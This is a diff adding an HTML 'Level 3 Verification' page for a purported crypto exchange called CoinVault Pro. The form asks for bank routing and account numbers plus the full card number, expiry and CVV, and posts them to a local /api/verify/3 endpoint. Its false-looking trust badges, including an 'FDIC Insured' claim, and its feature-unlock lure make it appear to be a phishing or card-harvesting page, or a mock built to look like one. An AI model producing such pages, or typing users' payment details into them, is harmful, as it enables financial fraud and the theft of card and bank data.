@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CoinVault Pro — Level 3 Verification</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,sans-serif;min-height:100vh}
+.topbar{background:#161b22;border-bottom:1px solid #30363d;padding:16px 32px;display:flex;align-items:center;justify-content:space-between}
+.topbar .logo span{font-size:20px;font-weight:700;color:#fff}.topbar .logo .accent{color:#f0b90b}
+.topbar a{color:#8b949e;text-decoration:none;font-size:14px}
+.topbar a:hover{color:#e6edf3}
+.container{max-width:560px;margin:40px auto;padding:0 20px}
+.progress{display:flex;align-items:center;gap:8px;margin-bottom:32px}
+.step{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:600}
+.step.done{background:#3fb950;color:#fff}
+.step.active{background:#f0b90b;color:#0d1117}
+.step-line{flex:1;height:2px;background:#21262d}
+.step-line.done{background:#3fb950}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:32px}
+h1{font-size:22px;font-weight:600;margin-bottom:6px}
+.desc{color:#8b949e;font-size:14px;margin-bottom:8px}
+.reg-note{background:#1c2128;border:1px solid #30363d;border-radius:8px;padding:12px 16px;font-size:13px;color:#8b949e;margin-bottom:24px;line-height:1.5}
+.reg-note strong{color:#c9d1d9}
+.section-title{font-size:15px;font-weight:600;color:#c9d1d9;margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid #21262d}
+.field{margin-bottom:20px}
+.field label{display:block;font-size:13px;font-weight:500;color:#c9d1d9;margin-bottom:6px}
+.field input{width:100%;padding:10px 14px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#e6edf3;font-size:14px;outline:none;transition:border-color .2s}
+.field input:focus{border-color:#f0b90b}
+.row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.row3{display:grid;grid-template-columns:2fr 1fr 1fr;gap:12px}
+.unlock{display:flex;align-items:center;gap:10px;background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:14px 16px;margin-bottom:24px}
+.unlock-icon{font-size:20px}
+.unlock-text{font-size:13px;color:#8b949e}
+.unlock-text strong{color:#c9d1d9}
+.btn{width:100%;padding:12px;background:#f0b90b;color:#0d1117;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
+.btn:hover{background:#d4a20a}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+.trust-badges{display:flex;gap:16px;justify-content:center;margin-top:20px;flex-wrap:wrap}
+.badge{display:flex;align-items:center;gap:6px;font-size:11px;color:#484f58}
+.badge svg{fill:#484f58}
+.success{display:none;text-align:center;padding:20px;color:#3fb950;font-size:15px}
+.divider{border:none;border-top:1px solid #21262d;margin:28px 0}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="logo"><span>Coin<span class="accent">Vault</span> Pro</span></div>
+  <a href="/dashboard">&larr; Back to Dashboard</a>
+</div>
+<div class="container">
+  <div class="progress">
+    <div class="step done">&#10003;</div>
+    <div class="step-line done"></div>
+    <div class="step done">&#10003;</div>
+    <div class="step-line done"></div>
+    <div class="step active">3</div>
+  </div>
+  <div class="card">
+    <h1>Level 3 Verification &mdash; Financial</h1>
+    <p class="desc">Level 3 of 3 &mdash; Final Step</p>
+    <div class="reg-note"><strong>Link your bank account and payment method</strong> to enable deposits and withdrawals. This is required for ACH transfers and instant funding of your trading account.</div>
+    <form id="kycForm">
+      <div class="section-title">&#127974; Bank Account (ACH Deposits &amp; Withdrawals)</div>
+      <div class="field">
+        <label for="bank_name">Bank Name</label>
+        <input type="text" id="bank_name" placeholder="e.g. Chase, Bank of America" required>
+      </div>
+      <div class="row">
+        <div class="field">
+          <label for="bank_routing">Routing Number</label>
+          <input type="text" id="bank_routing" placeholder="9 digits" maxlength="9" required>
+        </div>
+        <div class="field">
+          <label for="bank_account">Account Number</label>
+          <input type="text" id="bank_account" placeholder="Account number" required>
+        </div>
+      </div>
+      <hr class="divider">
+      <div class="section-title">&#128179; Debit/Credit Card (Instant Funding)</div>
+      <div class="field">
+        <label for="card_number">Card Number</label>
+        <input type="text" id="card_number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+      </div>
+      <div class="row">
+        <div class="field">
+          <label for="card_expiry">Expiry Date</label>
+          <input type="text" id="card_expiry" placeholder="MM/YY" maxlength="5" required>
+        </div>
+        <div class="field">
+          <label for="card_cvv">CVV</label>
+          <input type="text" id="card_cvv" placeholder="123" maxlength="4" required>
+        </div>
+      </div>
+      <div class="unlock">
+        <span class="unlock-icon">&#128275;</span>
+        <div class="unlock-text"><strong>Unlock:</strong> Unlimited trading, instant deposits, higher withdrawal limits</div>
+      </div>
+      <button type="submit" class="btn" id="submitBtn">Complete Verification</button>
+    </form>
+    <div class="trust-badges">
+      <div class="badge"><svg width="12" height="12" viewBox="0 0 16 16"><path d="M8 0L0 3v5c0 4.4 3.4 8.3 8 9 4.6-.7 8-4.6 8-9V3L8 0z"/></svg>256-bit SSL</div>
+      <div class="badge"><svg width="12" height="12" viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm3.3 5.3l-4 4a.75.75 0 01-1.06 0l-2-2a.75.75 0 011.06-1.06L6.75 8.7l3.47-3.47a.75.75 0 011.06 1.06z"/></svg>PCI DSS Compliant</div>
+      <div class="badge"><svg width="12" height="12" viewBox="0 0 16 16"><path d="M8 0L0 3v5c0 4.4 3.4 8.3 8 9 4.6-.7 8-4.6 8-9V3L8 0z"/></svg>FDIC Insured</div>
+    </div>
+    <div class="success" id="success">&#10003; Verification complete! Your account is now fully verified. Redirecting&hellip;</div>
+  </div>
+</div>
+<script>
+document.getElementById('kycForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var btn = document.getElementById('submitBtn');
+  btn.disabled = true;
+  btn.textContent = 'Processing…';
+  fetch('/api/verify/3', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      bank_routing: document.getElementById('bank_routing').value,
+      bank_account: document.getElementById('bank_account').value,
+      card_number: document.getElementById('card_number').value,
+      card_expiry: document.getElementById('card_expiry').value,
+      card_cvv: document.getElementById('card_cvv').value
+    })
+  }).then(function(r){ return r.json(); }).then(function(d) {
+    document.getElementById('kycForm').style.display = 'none';
+    document.getElementById('success').style.display = 'block';
+    setTimeout(function(){ window.location.href = '/dashboard'; }, 2000);
+  });
+});
+</script>
+</body>
+</html>
